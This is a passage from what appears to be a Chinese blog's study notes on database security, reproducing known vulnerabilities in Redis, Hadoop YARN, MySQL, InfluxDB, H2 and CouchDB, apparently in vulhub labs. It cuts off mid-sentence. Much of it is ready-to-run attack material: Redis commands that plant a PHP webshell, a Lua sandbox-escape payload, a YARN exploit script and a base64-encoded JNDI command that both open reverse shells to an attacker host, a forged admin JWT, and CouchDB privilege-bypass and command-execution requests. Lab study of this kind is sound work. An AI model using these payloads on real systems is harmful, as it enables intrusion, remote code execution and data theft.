      </categories>
      
      
        <tags>
            
            <tag> 哈希 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】数据库安全笔记</title>
      <link href="/2024/09/30/WebSecurity/owasptop/database-security/"/>
      <url>/2024/09/30/WebSecurity/owasptop/database-security/</url>
      
        <content type="html"><![CDATA[<p>渗透测试 | Redis渗透 <a href="https://www.freebuf.com/articles/web/281161.html">https://www.freebuf.com/articles/web/281161.html</a><br>Redis-未授权访问-CVE-2022-0543 (redis沙盒逃逸) <a href="https://blog.csdn.net/MateSnake/article/details/138820548">https://blog.csdn.net/MateSnake/article/details/138820548</a><br>InfluxDB JWT未授权漏洞（CVE-2019-20933）复现 <a href="https://www.cnblogs.com/BMCel/p/18025462">https://www.cnblogs.com/BMCel/p/18025462</a><br>数据库安全：InfluxDB 未授权访问-Jwt验证不当 漏洞. <a href="https://blog.csdn.net/weixin_54977781/article/details/134346421">https://blog.csdn.net/weixin_54977781/article/details/134346421</a><br>H2database 未授权访问 vulhub  <a href="https://blog.csdn.net/c0529/article/details/139624113">https://blog.csdn.net/c0529/article/details/139624113</a><br>深入分析H2数据库控制台中无需身份验证的RCE漏洞 <a href="https://zhuanlan.zhihu.com/p/459941555">https://zhuanlan.zhihu.com/p/459941555</a></p><h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>首先整理出一个表格，方便参考：</p><table><thead><tr><th>#</th><th>数据库</th><th>简介</th><th>默认端口</th><th>特性</th><th>已知CVE漏洞</th></tr></thead><tbody><tr><td>1</td><td>Redis</td><td>开源的内存数据结构存储系统，用作数据库、缓存和消息代理。</td><td>6379</td><td>支持字符串、哈希、列表、集合等多种数据结构。</td><td>CVE-2022-0543、CVE-2023-36824、CVE-2023-28856</td></tr><tr><td>2</td><td>Hadoop</td><td>允许在计算机集群中分布式处理大数据集的框架。</td><td>50070 &#x2F; 50075 &#x2F; 50010</td><td>存储和处理大量数据的能力。</td><td>CVE-2016-5397, CVE-2017-15718</td></tr><tr><td>3</td><td>MySQL</td><td>开源关系数据库管理系统，以其可靠性和易用性著称。</td><td>3306</td><td>支持全文搜索、SSL支持、分区和复制等功能。</td><td>CVE-2012-2122</td></tr><tr><td>4</td><td>InfluxDB</td><td>专门设计用于处理高写入和查询负载的时间序列数据库。</td><td>8086 &#x2F; 8088</td><td>高效处理时间序列数据，支持SQL-like查询语言。</td><td>CVE-2019-20933</td></tr><tr><td>5</td><td>H2 Database</td><td>轻量级开源关系数据库，用Java编写，设计用于嵌入Java应用中。</td><td>8082 &#x2F; 9092</td><td>支持标准SQL和JDBC API，支持嵌入式和服务器模式，提供强加密。</td><td>CVE-2021-23463</td></tr><tr><td>6</td><td>CouchDB</td><td>使用JSON文档的NoSQL文档数据库，支持HTTP API和JavaScript的MapReduce查询。</td><td>5984</td><td>支持ACID属性，多版本并发控制，复制提高可扩展性和容错能力。</td><td>CVE-2017-12636, CVE-2018-8007</td></tr><tr><td>7</td><td>ElasticSearch</td><td>基于Lucene库的搜索引擎，提供分布式、多租户能力的全文搜索引擎。</td><td>9200 &#x2F; 9300</td><td>简单的REST APIs，分布式特性，速度快，可扩展。</td><td>CVE-2021-22145, CVE-2018-17246</td></tr><tr><td>8</td><td>Oracle</td><td>由Oracle公司生产的多模型数据库管理系统。</td><td>1521</td><td>强大的数据完整性、复杂事务、强安全特性和广泛的数据分析功能。</td><td>CVE-2021-35587, CVE-2019-2729</td></tr><tr><td>9</td><td>SQL Server</td><td>微软开发的关系数据库管理系统。</td><td>1433</td><td>支持广泛的事务处理、商业智能和分析应用。</td><td>CVE-2021-1636, CVE-2017-8517</td></tr><tr><td>10</td><td>PostgreSQL</td><td>开源关系数据库，以可靠性、功能强大和性能著称。</td><td>5432</td><td>支持高级SQL标准、JSON、XML，有强大的社区支持。</td><td>CVE-2022-1552, CVE-2019-10208、CVE-2019-10164</td></tr><tr><td>11</td><td>MongoDB</td><td>跨平台的文档导向数据库，使用类JSON的文档，可选模式。</td><td>27017</td><td>支持临时查询、索引和实时聚合。</td><td>CVE-2023-20052, CVE-2021-20329</td></tr></tbody></table><p>具体来说，可以通过报错、端口探测等方式首先确定数据库类型，之后再针对性分析</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>REmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。<br>Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（List），集合（sets）和有序集合（sorted sets）等类型。从2010年3月15日起，Redis的开发工作由 Mware主持。从2013年5月开始，Redis的开发由 Pivotal赞助。目前最新稳定版本为4.0.8<br>Redis是一个开源的高性能键值数据库。最热门的NoSq数据库之一，也被人们称为数据结构服务器。<br>最大的特点就是 ：快</p><ol><li>以内存作为数据存储介质，读写数据的效率极高。</li><li>储存在 Redis中的数据是持久化的，断电或重启，数据也不会丢失</li><li>存储分为内存存储、磁盘存储和log文件。</li><li>可以从磁盘重新将数据加载到內存中，也可以通过配置文件对其进行配置，因此，redis才能实现持久化</li><li>支持主从模式，可以配置集群，更利于支撑大型的项目。<br>Redis默认端口：6379 sentinel.conf配置器端口为26379</li></ol><h3 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>Redis安装后，如果绑定在 0.0.0.0:6379，并且没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证或使用弱口令的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。<br>常用命令：<br>1.查看信息：info<br>2.删除所有数据库內容：flushable<br>3.刷新数据库：flush<br>4.看所有键：KEYS*，使用 select nun可以查看键值数据。<br>5.设置变量：set test“who am i<br>6.config set dir dirpath设置路径等配置7.config get dir&#x2F;filename获取路径及数据配置信息<br>8.save保存<br>9.get变量，查看变量名称</p><p>Redis写入webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/    //切换目录到网站的根目录</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span>    //写入恶意代码phpinfo()</span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;1&#x27;]);?&gt;\n\n\n&quot;</span>         //写入一句话木马</span><br><span class="line">config <span class="built_in">set</span> dbfilename a001.php      //磁盘中生成木马文件a001.php</span><br><span class="line">save        //进行保存</span><br></pre></td></tr></table></figure><h3 id="未授权访问-CVE-2022-0543"><a href="#未授权访问-CVE-2022-0543" class="headerlink" title="未授权访问-CVE-2022-0543"></a>未授权访问-CVE-2022-0543</h3><p>Redis 存在代码注入漏洞，Redis 支持使用 Lua 脚本来执行复杂的操作。Lua 脚本在 Redis 中运行在一个被称为“沙箱”的环境中，该环境应限制脚本只能执行安全的操作，阻止访问外部系统资源，如文件系统或系统函数。然而，由于 Debian 和 Ubuntu 的打包错误，Lua 沙箱中错误地包含了 package 对象。<br>2.2 &lt;&#x3D; redis &lt; 5.0.13、2.2 &lt;&#x3D; redis &lt; 6.0.15、2.2 &lt;&#x3D; redis &lt; 6.2.5，首先需要能够成功登陆redis，之后使用下面的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure><p>payload的whoami为可以执行的任意系统命令位置，可以换成id或者pwd等等<br>漏洞原理：<br>因为Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package<br>攻击者可通过package中的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0中的函数luaopen_io，在Lua中执行这个导出函数，即可获得io库，再使用其执行命令。<br>POC解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);    // 通过loadlib函数加载动态连接库中的luaopen_io函数，并赋给io_l</span><br><span class="line">local io = io_l();    // 执行io_l()，获取io库</span><br><span class="line">local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);     // 通过io库中的popen来执行命令，并把执行结果返回赋给f</span><br><span class="line">local res = f:read(&quot;*a&quot;);    // 读取f中命令执行的结果内容</span><br><span class="line">f:close();    // 关闭f</span><br><span class="line">return res    // 将读取的结果内容返回</span><br></pre></td></tr></table></figure><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoop是一个由Apache基金会开发的分布式系统基础架构，主要解决海量数据的存储和分析计算问题。Hadoop的主要用于：</p><ul><li>分布式存储：通过Hadoop分布式文件系统（HDFS），Hadoop能够存储海量数据，提供高吞吐量的数据访问。</li><li>分布式计算：利用MapReduce编程模型，Hadoop能够处理大量数据集，执行并行计算任务，提高数据处理效率。</li><li>数据挖掘和分析：Hadoop支持复杂的数据分析和数据挖掘任务，帮助用户从大规模数据集中提取有价值的信息。<br>Hadoop YARN的ResourceManager是集群资源分配和调度的关键，若出现未授权访问漏洞，可能使未认证用户访问或操纵资源，引发数据泄露、资源滥用或服务中断。此类安全问题需及时修复，以保护集群安全。<br>该漏洞涉及版本：hadoop 3.3.0以下,访问&#x2F;cluster&#x2F;apps页面：（该页面存在说明存在未授权访问漏洞）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用以下官方exp反弹shell</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>这段 Python 脚本是一个针对 Hadoop YARN (Yet Another Resource Negotiator) 的漏洞利用（exploit）示例，用于反弹 Shell 到指定的监听器。这个脚本的原理是通过未经授权的 API 访问向 YARN 提交一个恶意应用，然后利用 YARN 的应用管理机制来执行任意命令。</li></ul><ol><li><strong>设置目标和监听主机</strong>：<ul><li><code>target</code> 设置为 YARN ResourceManager 的 Web 接口。</li><li><code>lhost</code> 设置为攻击者的监听 IP 地址，用于接收反弹的 Shell。</li></ul></li><li><strong>请求新应用 ID</strong>：<ul><li>脚本首先向 YARN 的 <code>ws/v1/cluster/apps/new-application</code> 发送 POST 请求，这个 API 调用用于获取一个新的应用程序 ID。</li><li>响应中包含 <code>application-id</code>，这是后续提交应用时必须使用的。</li></ul></li><li><strong>构造恶意应用数据</strong>：<ul><li>接下来，脚本构建一个包含恶意命令的 JSON 数据体。</li><li><code>application-id</code> 是从前一步获取的 ID。</li><li><code>application-name</code> 可以是任意名称，在这里设置为 ‘get-shell’。</li><li><code>am-container-spec</code> 是 YARN 中管理应用生命周期的组件，其中 <code>commands</code> 字段用于定义应用启动时执行的命令。这里的命令是一个典型的反弹 Shell 命令 <code>/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1</code>，这条命令尝试创建一个到攻击者 <code>lhost</code> 上 9999 端口的反向 TCP 连接。</li><li><code>application-type</code> 设置为 ‘YARN’，这指定了应用程序类型。</li></ul></li><li><strong>提交恶意应用并触发执行</strong>：<ul><li>最后，脚本将包含恶意数据的 JSON 发送到 <code>ws/v1/cluster/apps</code>，通过 POST 请求实际提交并尝试启动这个应用。</li><li>如果 YARN 未正确配置安全控制，这个请求将成功，YARN 将按照提供的恶意命令执行，导致在指定的 IP 和端口上打开一个反向 Shell。</li></ul></li></ol><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="CVE-2012-2122-未授权远程访问"><a href="#CVE-2012-2122-未授权远程访问" class="headerlink" title="CVE-2012-2122 未授权远程访问"></a>CVE-2012-2122 未授权远程访问</h3><p>CVE-2012-2122 影响的是 MySQL 5.1.x 版本到 5.1.61，MySQL 5.5.x 版本到 5.5.24，以及某些 5.0 版本。这个漏洞主要影响运行在 Linux、OS X、Solaris 平台的 MySQL 版本，Windows 版本由于认证实现的差异通常不受影响。<br>漏洞的利用相对简单，攻击者可以通过重复尝试使用错误的密码登录，直到由于内存比较的错误导致成功登录。在某些情况下，攻击者可能只需要尝试约 256 次即可成功绕过认证。这种利用方式不需要特别复杂的技术，普通的脚本工具就能完成。</p><p>该漏洞源于 MySQL 服务端在验证用户密码时的一个逻辑错误。在 MySQL 中，客户端发送的密码是一个散列值，服务端会将这个散列与期望的散列值进行比较。问题出在比较这两个散列值的函数上（<code>memcmp()</code>），这个函数在某些情况下会由于 CPU 架构的问题错误地返回 0（即认为两个散列值相等），尤其是在 x86 架构的处理器上。<br>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</span><br></pre></td></tr></table></figure><p>在 MySQL 源代码中，漏洞相关的部分主要是 <code>sql/password.c</code> 中的 <code>check_scramble()</code> 函数。问题代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_bool <span class="title function_">check_scramble</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *scramble_arg, <span class="type">const</span> <span class="type">char</span> *message, <span class="type">const</span> ulong *hash_stage2)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcmp</span>(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数在比较两个散列值时可能会因为处理器的优化方式和内存对齐问题导致预期外的结果。</p><h2 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h2><p>InfluxDB是一款时序数据库，其使用JWT作为鉴权方式。在其1.7.6版本以前，默认设置JWT的认证密钥shared-secret为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。漏洞原理是1.7.6之前的InfluxDB在services&#x2F;httpd&#x2F;handler.go中的身份验证函数中存在身份验证绕过漏洞，因为JWT令牌可能具有空的共享密钥（也被称为共享密钥）。</p><p>第一步：访问 <a href="http://ip地址:8086/debug/vars">http://IP地址:8086/debug/vars</a> 查看能不能访问到系统的服务信息，如果能 则可能存在漏洞.（8086 是默认端口.）<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image.png"><br>第二步：访问 <a href="http://ip地址:8086/query">http://IP地址:8086/query</a> 查看查询功能是否会有提示需要登录。<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-1.png"><br>第三步：添加 POST 请求值.<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-2.png"><br>第四步：访问 URL ，然后用 Burp 进行抓包，再发给 Repeater（重发器）<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-3.png"><br>第五步：通过 JSON Web Tokens - jwt.io 生成所需要的 Token：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">3751718877</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>username需要已存在的用户才行，所以使用 admin 用户就好.exp是时间戳 ，这个时间戳一定要是未来的时间才行，这里生成了一个 2088 年的时间戳（所以我下面的Encoded值可以直接用）：3751718877： <a href="https://www.beijing-time.org/shijianchuo">https://www.beijing-time.org/shijianchuo</a><br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-4.png"><br>第六步：在 Burp 抓包的数据包中添加 Authorization: Bearer (后面就是 Encoded 生成的值)【这个可以直接用，因为时间戳的结束是2088年】<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-5.png"><br>第七步：如果要进行其他操作则修改 q&#x3D; 你想要查看的信息就行。<br>show users# 显示用户<br>show databases# 显示数据库<br>create database xxx# 创建xxx数据库<br>drop database xxx# 删除xxx数据库<br>create user influx with password ‘***’ with all privileges;# 创建用户<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-6.png"></p><h2 id="H2database-未授权访问"><a href="#H2database-未授权访问" class="headerlink" title="H2database 未授权访问"></a>H2database 未授权访问</h2><p>H2数据库是一个纯Java开发的关系型数据库管理系统（RDBMS），它支持SQL和JDBC标准，具有高性能、小巧、易于使用和部署等特点。同时，它还支持嵌入式、内存和分布式模式，可以满足不同场景的需求。</p><p>H2数据库的特点：<br>1.高性能：H2使用纯Java开发，在性能上比其他Java数据库更有优势，同时支持多种存储引擎，如内存、磁盘等。<br>2.小巧：H2的安装包非常小，可以轻松部署，也不需要安装复杂的数据库服务，只要安装JRE即可。<br>3.易于使用：H2具有简单易用的图形界面，支持丰富的标准SQL和JDBC接口，并提供详细的文档和示例，可以快速上手。<br>4.部署灵活：H2支持嵌入式、内存和分布式模式，可满足不同应用场景的需求，例如Web应用、桌面应用等。<br>H2数据库是一款小巧、高性能、易于使用和部署的Java数据库，非常适合中小型应用的开发和部署。</p><p>H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在v2.1.210+中修复。2.1.210 之前的H2控制台允许远程攻击者通过包含子字符串的jdbc:h2:mem JDBC URL执行任意代码。</p><p>漏洞复现：<br>访问http:&#x2F;&#x2F;虚拟机ip:8080&#x2F;h2-console&#x2F;<br>打开之后是一个访问的页面，我们需要用java语言驱动让这个网站主动访问其他主机并且执行命令，需要用到一开始写在最前面的工具进行生成rmi工具（<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0%EF%BC%89%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0）基础使用方法：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 命令 -A 攻击者的ip（监听者的ip，填你自己的）</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDcuMTEvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 8.130.107.11//学了大佬的反弹shell，但是一zhi失败</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 192.168.43.156//这条成功了</span><br></pre></td></tr></table></figure><p>在驱动选择：javax.naming.InitialContext<br>url选择选择一个rmi填写<br>出现下方红色的字体就成功了，同时你的主机检测到了这个网站的访问<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-7.png"></p><h2 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h2><p>CouchDB是一个完全包含web的数据库。使用JSON文档存储数据。通过HTTP使用web浏览器访问您的文档。使用JavaScript查询、合并和转换文档。CouchDB适用于现代网络和移动应用程序。Apache CouchDB是一个开源的面向文档的NoSQL数据库，用Erlang实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用JSON来存储数据，使用MapReduce使用JavaScript作为查询语言，使用HTTP作为API。</p><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/120287521">https://blog.csdn.net/qq_45300786/article/details/120287521</a><br>端口可能是5984，直接访问端口是couchdb,访问&#x2F;_utils目录，网站title是一个红色沙发，title名是Project Fauxton还可以看到couchdb图标<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-8.png"><br>影响版本：小于 1.7.0 以及 小于 2.1.1，发送数据包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user<span class="punctuation">:</span>vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.34</span><span class="punctuation">:</span><span class="number">5984</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 94</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;vulhub&quot;,</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="comment">  &quot;password&quot;: &quot;vulhub&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>返回403错误：{“error”:”forbidden”,”reason”:”Only _admin may set roles”}，只有管理员才能设置Role角色：发送一次包含两个roles字段的数据包，即可绕过限制：<br>注意：1、roles字段必须为空，3、已创建的用户，你改密码的话，是不行的。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user<span class="punctuation">:</span>vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.34</span><span class="punctuation">:</span><span class="number">5984</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 94</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;vulhub&quot;,</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="comment">  &quot;password&quot;: &quot;vulhub&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>输入我们之前创建的账号密码：vulhub:vulhub <a href="http://xxxx:5984/_utils">http://xxxx:5984/_utils</a> 登录成功！ 同时即可看到user的数量多了1个</p><h3 id="Couchdb-任意命令执行-CVE-2017-12636"><a href="#Couchdb-任意命令执行-CVE-2017-12636" class="headerlink" title="Couchdb 任意命令执行 CVE-2017-12636"></a>Couchdb 任意命令执行 CVE-2017-12636</h3><p>影响版本：小于 1.7.0 以及 小于 2.1.1<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。<br>它允许已认证的用户在 CouchDB 服务器上执行任意命令。这个漏洞主要利用了 CouchDB 中的 <code>query_servers</code> 配置错误，这是 CouchDB 用于指定如何处理不同编程语言查询的设置。</p><p>1.6.0 下的说明<br>依次执行如下请求即可触发任意命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br><span class="line">curl -X POST &#x27;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&#x27; -d &#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27; -H &#x27;Content-Type:application/json&#x27;</span><br></pre></td></tr></table></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。<br>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。<br>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p><p>2.1.0 